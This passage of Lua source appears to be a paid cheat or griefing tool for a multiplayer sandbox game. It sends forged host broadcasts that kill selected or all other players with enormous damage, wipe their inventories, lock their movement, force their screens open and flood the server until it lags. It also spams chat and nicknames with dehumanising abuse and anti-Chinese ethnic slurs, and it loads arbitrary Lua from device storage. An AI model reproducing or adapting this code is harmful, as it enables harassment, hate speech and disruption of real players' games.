                    -- KIỂM TRA NẾU NGƯỜI ĐƯỢC CHỌN NẰM TRONG WHITELIST TOÀN CỤC
                    if whitelist and whitelist[selectedUin] then
                        _G.dffz_enabled = false
                        ShowGameTipsWithoutFilter("#RNgười này nằm trong danh sách trắng (Whitelist)!")
                        return
                    end

                    -- Lấy UID của bản thân
                    local myUin = nil
                    if AccountManager and AccountManager.getUin then
                        pcall(function()
                            myUin = AccountManager:getUin()
                        end)
                    end

                    -- Danh sách SkyBox để đổi luân phiên
                    local skyBoxIds = {30101, 30102, 30103, 30104, 30105, 30201, 30202, 30203, 30204}
                    local skyIndex = 1

                    -- ========================================================
                    -- MỞ LUỒNG CHẠY CHÍNH
                    -- ========================================================
                    _G.dffz_thread = threadpool:work(function()
                        ShowGameTipsWithoutFilter("#c00ffffĐã BẬT thực thi!")

                        while _G.dffz_enabled do
                            xpcall(function()
                                -- 1. Đổi SkyBox luân phiên liên tục theo thời gian chạy
                                local currentSkyId = skyBoxIds[skyIndex]
                                local tdataSky = { "world", "SetSkyBoxMaps", {1, currentSkyId, ""} }
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdataSky)
                                
                                skyIndex = skyIndex + 1
                                if skyIndex > #skyBoxIds then
                                    skyIndex = 1
                                end

                                -- 2. Tác động trực tiếp vào mục tiêu bạn đã chọn từ bảng
                                local targetUin = selectedUin
                                if targetUin and targetUin ~= myUin and not (whitelist and whitelist[targetUin]) then
                                    local tdata = { "player", "changPlayerMoveType", {targetUin, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "changeViewMode", {targetUin, 9, true} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 797} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 798} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "changeCustomModel", {targetUin, "role_11"} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "chat", "sendChat", {"#cFF3333Cái Giả Phải Trả Cho Mày !!\n#cFF3333Cái Giả Phải Trả Cho Mày !!", 1, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "chat", "sendChat", {"#cFF3333Cái Giả Phải Trả Cho Mày !!\n#cFF3333Cái Giả Phải Trả Cho Mày !!", 1, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "chat", "sendChat", {"#c99FF99Súc Vật Đáng Bị Giết\n#c99FF99Súc Vật Đáng Bị Giết\n", 1, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "notifyGameInfo2Self", {targetUin, "#cFFFFAAKhông#cEEFFAAThể#cDDFFAAChống#cCCFFAALại#cBBFFAAVị#cAAFFAAThần"} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "backpack", "clearAllPack", {targetUin} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {targetUin, 1, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 64, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 128, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "playerHurt", {myUin, targetUin, 1.8e+308, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setAtt", {targetUin, 1, 2} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                end
                            end, function(err)
                                print("Lỗi vòng lặp: " .. tostring(err))
                            end)

                            threadpool:wait(0.01) 
                        end

                        -- ========================================================
                        -- KHI KẾT THÚC VÒNG LẶP HOẶC TẮT
                        -- ========================================================
                        if selectedUin and selectedUin ~= myUin then
                            local restoreMove = { "player", "changPlayerMoveType", {selectedUin, 0} }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, restoreMove)
                        end

                        ShowGameTipsWithoutFilter("#c00ffffĐã TẮT thực thi thành công!")
                        _G.dffz_thread = nil
                    end)

                end, "选择要作用的目标")
            end
        end
    )
end

function pctn8()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng không (nếu có cơ chế bảo vệ)
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng.", 3)
        return
    end

    -- Hiển thị thông báo triệu hồi Boss núi lửa thành công
    ShowGameTipsWithoutFilter("#cAA3300T#cBB3300r#cCC3300i#cDD3300ệ#cEE3300u#cFF0000 #cFF3300h#cFF4D00ồ#cFF6600i#cFF8000 #cFF9900B#cFFB300o#cFFCC00s#cFFD600s#cFFEE00 #cFFFF00n#cFFFF33ú#cFFFF66i#cFFFF80 #cFFFF99l#cFFFFCCử#cFFFFDDa#cFFEEFF #cFFDDFFt#cFFCCFFh#cFFBBFFà#cFFAAFFn#cFF99FFh#cFF88FF #cFF77FFc#cFF66FFô#cFF55FFn#cFF44FFg#cFF33FF!")
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Lấy tọa độ người chơi và đổi ra tọa độ block
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local base_x = math.floor(x / 100)
    local base_y = math.floor(y / 100)
    local base_z = math.floor(z / 100)

    -- Định nghĩa danh sách ID [ID bệ, ID vật thể bên trên]
    local pairs_id = {
        {140, 587},
        {141, 588},
        {142, 589}
    }

    -- Khoảng cách từ người chơi đến vị trí đặt (phía trước)
    local start_x = base_x + 3
    local start_y = base_y
    local start_z = base_z

    -- Duyệt qua 3 cặp ID để đặt khối
    for i, item in ipairs(pairs_id) do
        local pedestal_id = item[1]
        local top_id = item[2]
        
        -- Xếp hàng ngang theo trục Z (mỗi khối cách nhau 2 ô)
        local current_x = start_x
        local current_y = start_y
        local current_z = start_z + (i - 1) * 2

        -- 1. Đặt bệ dưới
        local base_data = {
            [1] = "block",
            [2] = "placeBlock",
            [3] = { pedestal_id, current_x, current_y, current_z, 0, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, base_data)

        -- 2. Đặt khối/vật phẩm lên trên đỉnh (y + 1)
        local top_data = {
            [1] = "block",
            [2] = "placeBlock",
            [3] = { top_id, current_x, current_y + 1, current_z, 0, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, top_data)
    end
end
function lua_load_OnClick()
    threadpool:work(function()
        local prefix = '/storage/emulated/0/'
        local file, err = io.open(prefix .. "amn.lua", "rb")
        
        if not file then
            ShowGameTipsWithoutFilter("没有检测到文件")
            return
        end
        
        local content = file:read("*a")
        file:close()
        
        local status, result = pcall(loadstring(content))
        if not status then
            ShowGameTipsWithoutFilter("错误: " .. tostring(result))
        else
            result()
        end
    end)
end

function pctn9()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    ShowGameTipsWithoutFilter("#RĐã kích hoạt thành công")
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Biến lưu trữ UID mục tiêu nằm gọn trong hàm này
    local currentTargetUin = nil

    GetInst("MessageBoxInterface"):dualBtnBox(
        "Cái này lag lắm nên sài cẩn thận nhé!\nDừng lại ở bên trái\nBắt đầu từ bên phải",
        "关闭",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.dtms_enabled = false
                
                -- ========================================================
                -- KHÔI PHỤC SKYBOX KHI BẤM DỪNG (ĐÃ THÊM ĐỦ 2 LỆNH)
                -- ========================================================
                pcall(function()
                    if ScriptSupportTask and SSTASKID then
                        -- 1. Lệnh khôi phục SetSkyBoxTemplate {1}
                        local resetSkyTemplate = {
                            [1] = "world",
                            [2] = "SetSkyBoxTemplate",
                            [3] = {1}
                        }
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, resetSkyTemplate)

                        -- 2. Lệnh khôi phục SetSkyBoxFilter {0, 10, 1}
                        local resetSkyFilter = {
                            [1] = "world",
                            [2] = "SetSkyBoxFilter",
                            [3] = {0, 10, 1}
                        }
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, resetSkyFilter)
                    end
                end)
                -- ========================================================
                
                if currentTargetUin then
                    local enableAttack = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = { currentTargetUin, 32, true }
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                    end)
                    ShowGameTipsWithoutFilter("#cff0000Đã dừng, khôi phục Sky & phục hồi cho UID: " .. currentTargetUin)
                else
                    ShowGameTipsWithoutFilter("#cFF0000Đã dừng thực thi & Khôi phục Sky ban đầu!")
                end
                
            elseif btnType == 1 then
                _G.dtms_enabled = false
                
                if _G.dtms_thread then
                    _G.dtms_thread = nil
                end
                
                threadpool:wait(0.1)
                
                ShowPlayerList(function(selectedUin)
                    if not selectedUin then
                        ShowGameTipsWithoutFilter("#RĐã hủy chọn người chơi")
                        return
                    end

                    -- KIỂM TRA NẾU NGƯỜI ĐƯỢC CHỌN NẰM TRONG WHITELIST TOÀN CỤC
                    if whitelist and whitelist[selectedUin] then
                        _G.dtms_enabled = false
                        ShowGameTipsWithoutFilter("#RNgười này nằm trong danh sách trắng (Whitelist)!")
                        return
                    end

                    currentTargetUin = selectedUin
                    local targetUin = currentTargetUin

                    _G.dtms_enabled = true
                    ShowGameTipsWithoutFilter("#c00ffffBắt đầu thực thi mã...")

                    -- ========================================================
                    -- GỬI LỆNH SKYBOX TRƯỚC KHI TẤN CÔNG
                    -- ========================================================
                    pcall(function()
                        if ScriptSupportTask and SSTASKID then
                            -- 1. Lệnh SetSkyBoxFilter {0, 6, 5}
                            local skyFilter = {
                                [1] = "world",
                                [2] = "SetSkyBoxFilter",
                                [3] = {0, 6, 5}
                            }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, skyFilter)
                            ShowGameTipsWithoutFilter("#c00ff00Đã gửi lệnh SetSkyBoxFilter thành công!")

                            -- 2. Lệnh đổi SkyBox thành 30102
                            local skyMap = {
                                [1] = "world",
                                [2] = "SetSkyBoxMaps",
                                [3] = {1, 30102, ""}
                            }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, skyMap)
                        end
                    end)
                    -- ========================================================

                    _G.dtms_thread = threadpool:work(function()
                        local myUin = AccountManager:getUin()
                        
                        while _G.dtms_enabled do
                            for loopCount = 1, 800 do
                                if not _G.dtms_enabled then
                                    break
                                end

                                local dAttack = { [1] = "gamerule", [2] = "setKillNotify", [3] = {false} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, dAttack) end)
                                
                                local diAttack = { [1] = "gamerule", [2] = "setScoreKillPlayer", [3] = {100} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, diAttack) end)

                                if loopCount % 10 == 1 then
                                    local keepDisable = { [1] = "player", [2] = "setActionAttrState", [3] = {targetUin, 32, false} }
                                    pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable) end)
                                end
                                
                                local disableAttack = { [1] = "player", [2] = "forceOpenBoxUI", [3] = {targetUin, 797} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack) end)
                                
                                local setNick = { [1] = "actor", [2] = "setnickname", [3] = {targetUin, '#cFF0000Sinh vật thấp kém #W(Không đáng làm#K con người)'} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setNick) end)
                                
                                local changeModel = { [1] = "actor", [2] = "changeCustomModel", [3] = {targetUin, [=[role_11]=]} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, changeModel) end)
                                
                                local lockAttack = { [1] = "player", [2] = "setActionAttrState", [3] = {targetUin, 32, false} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, lockAttack) end)
                                
                                local setAttackable = { [1] = "player", [2] = "setActionAttrState", [3] = {targetUin, 64, true} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttackable) end)
                                
                                local clearBuff = { [1] = "buff", [2] = "clearAllBuff", [3] = {targetUin} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff) end)
                                
                                local t1 = { [1] = "actor", [2] = "playBodyEffectByFile", [3] = {targetUin, "jiguang01", true} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t1) end)
                                
                                local t10 = { [1] = "actor", [2] = "playBodyEffectByFile", [3] = {targetUin, "aotu_06_leishenzhichui", true} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t10) end)
                                
                                local t2 = { [1] = "player", [2] = "setAtt", [3] = {targetUin, 1, 1} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t2) end)

                                local t3 = { [1] = "player", [2] = "setAtt", [3] = {targetUin, 1, 2} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t3) end)

                                local tdata = { [1] = "player", [2] = "setAtt", [3] = {targetUin, 1, 1} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) end)

                                local t4 = { [1] = "actor", [2] = "playerHurt", [3] = {myUin, targetUin, 1.8e+308, 0} }
                                pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t4) end)
                                
                                if loopCount % 100 == 0 then
                                    ShowGameTipsWithoutFilter("#c00ffffTiến độ đợt này: " .. loopCount .. "/800")
                                end
                            end

                            if not _G.dtms_enabled then
                                break
                            end
                            
                            ShowGameTipsWithoutFilter("#c00ffffHoàn thành đợt lặp, nghỉ ngơi...")
                            threadpool:wait(6)
                        end
                        
                        if currentTargetUin then
                            local enableAttack = { [1] = "player", [2] = "setActionAttrState", [3] = { currentTargetUin, 32, true } }
                            pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack) end)
                        end

                        local tdata1 = {
                            [1] = "chat",
                            [2] = "sendChat",
                            [3] = {"#cFF0000Tại sao mày lại dám chống lại thần của mày？\n#cFF0000Tại sao mày lại dám chống lại thần của mày？\n#cFF0000Tại sao mày lại dám chống lại thần của mày？\n", 1, 0}
                        }
                        pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1) end)

                        local tdata2 = {
                            [1] = "chat",
                            [2] = "sendChat",
                            [3] = {"#cFF0000 Không Đáng Được Sống Ở Đây！\n#cFF0000 Không Đáng Được Sống Ở Đây！\n#cFF0000 Không Đáng Được Sống Ở Đây！\n", 1, 0}
                        }
                        pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2) end)

                        local tdata3 = {
                            [1] = "chat",
                            [2] = "sendChat",
                            [3] = {"#cFF0000 Không Đáng Được Sống Ở Đây！\n#cFF0000 Không Đáng Được Sống Ở Đây！\n#cFF0000 Không Đáng Được Sống Ở Đây！\n", 1, 0}
                        }
                        pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata3) end)

                        local tdata4 = {
                            [1] = "chat",
                            [2] = "sendChat",
                            [3] = {"#b#BCặn bã #Kcủa xã hội！\n#b#BCặn bã #Kcủa xã hội！\n#b#BCặn bã #Kcủa xã hội！", 1, 0}
                        }
                        pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata4) end)

                        if currentTargetUin then
                            ShowGameTipsWithoutFilter("#cff0000Đã dừng và khôi phục cho UID: " .. currentTargetUin)
                        end
                        _G.dtms_thread = nil
                    end)

                end, "选择要作用的目标")
            end
        end
    )
end

function pctn10()
    -- Thông báo khởi động thành công
    ShowGameTipsWithoutFilter("#RĐã kích hoạt thành công")
    
    -- Tự động đóng giao diện sách bài hát (hoặc giao diện hiện tại)
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)
    
    -- Hộp thoại chức năng mô phỏng bom bản đồ (trái: dừng, phải: bật)
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng lại ở bên trái\nBắt đầu từ bên phải",
        "Dừng",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.dffz_enabled = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng lại")
                
            elseif btnType == 1 then
                -- 重置状态
                _G.dffz_enabled = false
                
                -- 等待旧线程完全退出
                if _G.dffz_thread then
                    _G.dffz_thread = nil
                end
                
                -- 延迟一下再开启，确保旧线程已退出
                threadpool:wait(0.1)
                
                _G.dffz_enabled = true
                ShowGameTipsWithoutFilter("#cFF3333Hỡi Tổ Quốc Hãy Chiến Đấu!!")
                
                if whitelist == nil then
                    whitelist = {}
                end
                
                -- 使用 threadpool:work 创建新线程
                _G.dffz_thread = threadpool:work(function()
                    local loopCount = 0
                    while _G.dffz_enabled do
                        loopCount = loopCount + 1
                        
                        xpcall(function()
                            local myUin = AccountManager:getUin()
                            local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
                            
                            for i = 1, size do
                                if not _G.dffz_enabled then break end
                                local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                                if targetPlayer then
                                    local targetUin = targetPlayer:getUin()
                                    if targetUin ~= myUin then
                                        if not whitelist[targetUin] then
                                            local tdata = {}
                                            tdata[1] = "player"
                                            tdata[2] = "changPlayerMoveType"
                                            tdata[3] = {targetUin, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            tdata = {}
                                            tdata[1] = "world"
                                            tdata[2] = "SetTimeVanishingSpeed"
                                            tdata[3] = {500}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            tdata = {}
                                            tdata[1] = "player"
                                            tdata[2] = "changeViewMode"
                                            tdata[3] = {targetUin, 9, true}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            tdata = {}
                                            tdata[1] = "player"
                                            tdata[2] = "forceOpenBoxUI"
                                            tdata[3] = {targetUin, 797}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            tdata = {}
                                            tdata[1] = "actor"
                                            tdata[2] = "changeCustomModel"
                                            tdata[3] = {targetUin, "role_11"}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFFFF00-剑#cFFCC00气#cFF9900纵#cFF6600横#cFF3300三#cFF0000千#cEE3300里#cDD3300 #cCC3300-#cBB3300 #cAA3300越#c990000南#cCC0000永#cFF0000胜#cFF3300！", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFFFF00-剑#cFFCC00气#cFF9900纵#cFF6600横#cFF3300三#cFF0000千#cEE3300里#cDD3300 #cCC3300-#cBB3300 #cAA3300越#c990000南#cCC0000永#cFF0000胜#cFF3300！", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFFFF00星#cFFCC00河#cFF9900倒#cFF6600转#cFF3300镇#cFF0000乾#cEE3300坤#cDD3300-#cCC3300 #cAA3300南#c990000国#cCC0000威#cFF0000武#cFF3300！", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFFFF00星#cFFCC00河#cFF9900倒#cFF6600转#cFF3300镇#cFF0000乾#cEE3300坤#cDD3300-#cCC3300 #cAA3300南#c990000国#cCC0000威#cFF0000武#cFF3300！", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFFFF00气#cFFCC00吞#cFF9900山#cFF6600河#cFF3300耀#cFF0000寰#cEE3300宇#cDD3300-#cCC3300 #cAA3300世#c990000代#cCC0000雄#cFF0000风#cFF3300！", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFFFF00气#cFFCC00吞#cFF9900山#cFF6600河#cFF3300耀#cFF0000寰#cEE3300宇#cDD3300-#cCC3300 #cAA3300世#c990000代#cCC0000雄#cFF0000风#cFF3300！", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFFFF00威#cFFCC00震#cFF9900四#cFF6600海#cFF3300定#cFF0000乾#cEE3300坤#cDD3300-#cCC3300 #cAA3300威#c990000名#cCC0000远#cFF0000扬#cFF3300！", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFFFF00威#cFFCC00震#cFF9900四#cFF6600海#cFF3300定#cFF0000乾#cEE3300坤#cDD3300-#cCC3300 #cAA3300威#c990000名#cCC0000远#cFF0000扬#cFF3300！", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFFFF00日#cFFCC00月#cFF9900同#cFF6600辉#cFF3300照#cFF0000山#cEE3300河#cDD3300-#cCC3300 #cAA3300辉#c990000煌#cCC0000永#cFF0000存#cFF3300！", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFFFF00日#cFFCC00月#cFF9900同#cFF6600辉#cFF3300照#cFF0000山#cEE3300河#cDD3300-#cCC3300 #cAA3300辉#c990000煌#cCC0000永#cFF0000存#cFF3300！", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)


                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFFFF00傲#cFFCC00视#cFF9900群#cFF6600雄#cFF3300唯#cFF0000我#cEE3300南#cDD3300国 #cCC3300-#cAA3300威#c990000震#cCC0000八#cFF0000方#cFF3300！", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                            tdata = {}
                                            tdata[1] = "chat"
                                            tdata[2] = "sendChat"
                                            tdata[3] = {"#cFFFF00傲#cFFCC00视#cFF9900群#cFF6600雄#cFF3300唯#cFF0000我#cEE3300南#cDD3300国 #cCC3300-#cAA3300威#c990000震#cCC0000八#cFF0000方#cFF3300！", 1, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            tdata = {}
                                            tdata[1] = "player"
                                            tdata[2] = "notifyGameInfo2Self"
                                            tdata[3] = {targetUin, "#cFF66CC中#cFF66B2国#cFF6699是#cFF6680一#cFF6666个#cFF8066巨#cFF9966大#cFFB266的#cFFCC66耻#cFFE066辱#cFFFF66它#cFFFF4D不#cFFFF33配#cFFFF1A被#cFFFF00视#cFFFF33为#cFFFF66人#cFFFF99类#cFFFFCC。"}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            tdata = {}
                                            tdata[1] = "actor"
                                            tdata[2] = "setnickname"
                                            tdata[3] = {targetUin, "#b#cFF3333击败中国以保卫祖国！"}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            tdata = {}
                                            tdata[1] = "backpack"
                                            tdata[2] = "clearAllPack"
                                            tdata[3] = {targetUin}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            tdata = {}
                                            tdata[1] = "player"
                                            tdata[2] = "setActionAttrState"
                                            tdata[3] = {targetUin, 1, false}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            tdata = {}
                                            tdata[1] = "player"
                                            tdata[2] = "setActionAttrState"
                                            tdata[3] = {myUin, 64, false}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            tdata = {}
                                            tdata[1] = "player"
                                            tdata[2] = "setActionAttrState"
                                            tdata[3] = {myUin, 128, false}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            for _, skyId in ipairs({30005, 30006, 30007, 30008, 30009}) do
                                                tdata = {}
                                                tdata[1] = "world"
                                                tdata[2] = "SetSkyBoxMaps"
                                                tdata[3] = {1, skyId, ""}
                                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            end
                                            
                                            tdata = {}
                                            tdata[1] = "actor"
                                            tdata[2] = "playerHurt"
                                            tdata[3] = {myUin, targetUin, 1.8e+308, 0}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            tdata = {}
                                            tdata[1] = "player"
                                            tdata[2] = "setAtt"
                                            tdata[3] = {targetUin, 1, 2}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            
                                            for _, fx in ipairs({"yanhua", "12834", "bossskill_lasertailblue", "ice_bingshi_boss", "mob_3514_white", "nengliang_xiqu", "nengliang_baozha"}) do
                                                tdata = {}
                                                tdata[1] = "actor"
                                                tdata[2] = "playBodyEffectByFile"
                                                tdata[3] = {myUin, fx, true}
                                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                            end
                                            
                                            tdata = {}
                                            tdata[1] = "actor"
                                            tdata[2] = "playBodyEffectByFile"
                                            tdata[3] = {targetUin, "jiguang01", true}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        end
                                    end
                                end
                            end
                        end, function(err)
                            print("Lỗi vòng lặp gây treo/văng bản đồ: " .. tostring(err))
                        end)
                        
                        threadpool:wait(0.0000001)
                    end
                    print("Vòng lặp dọn dẹp bản đồ đã kết thúc")
                    _G.dffz_thread = nil
                end)
            end
        end
    )
end

function pctn11()
    -- Thông báo khởi động giao diện
    ShowGameTipsWithoutFilter("#c006600Đã #c009900kích #c00CC00hoạt #c33FF33thành #c66FF66công #c99FF99chế #cCCFFCCđộ #cE6FFE6phật #cFFFFFFtổ")

    -- Tự động đóng giao diện sách bài hát (hoặc giao diện hiện tại)
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)
    
    -- Hộp thoại điều khiển bật/tắt (Trái: dừng, Phải: bật)
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng lại ở bên trái\nBắt đầu từ bên phải",
        "Dừng",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                -- Nút trái: Dừng vòng lặp
                _G.dffz_enabled = false
                ShowGameTipsWithoutFilter("#c003300Đ#c004400ã#c005500 #c006600d#c007700ừ#c008800n#c009900g#c00AA00 #c00BB00l#c00CC00ạ#c00DD00i#c00EE00 #c00FF00s#c33FF33ự#c55FF55 #c77FF77t#c99FF99r#cBBFFBBứ#cCCFFCCn#cDDFFDDg#cEEFFEE #cE8FFE8p#cFAFFFAh#cFAFFFAạ#cFFFFFFt")
                
            elseif btnType == 1 then
                -- Nút phải: Bật vòng lặp (Reset trạng thái cũ trước)
                _G.dffz_enabled = false
                
                if _G.dffz_thread then
                    _G.dffz_thread = nil
                end
                
                -- Đợi nhẹ để luồng cũ dứt hẳn
                threadpool:wait(0.1)
                
                _G.dffz_enabled = true
                ShowGameTipsWithoutFilter("#cFF3333Đã bật sự trừng phạt của đức Phật!")
                
                -- Tạo luồng chạy vòng lặp ngầm
                _G.dffz_thread = threadpool:work(function()
                    -- Kiểm tra và khởi tạo danh sách trắng nếu chưa có
                    if whitelist == nil then
                        whitelist = {}
                    end

                    while _G.dffz_enabled do
                        xpcall(function()
                            if not (CurWorld and CurMainPlayer and ClientCurGame and ClientCurGame:isInGame()) then
                                return
                            end

                            local myUin = AccountManager:getUin()
                            if not myUin then return end

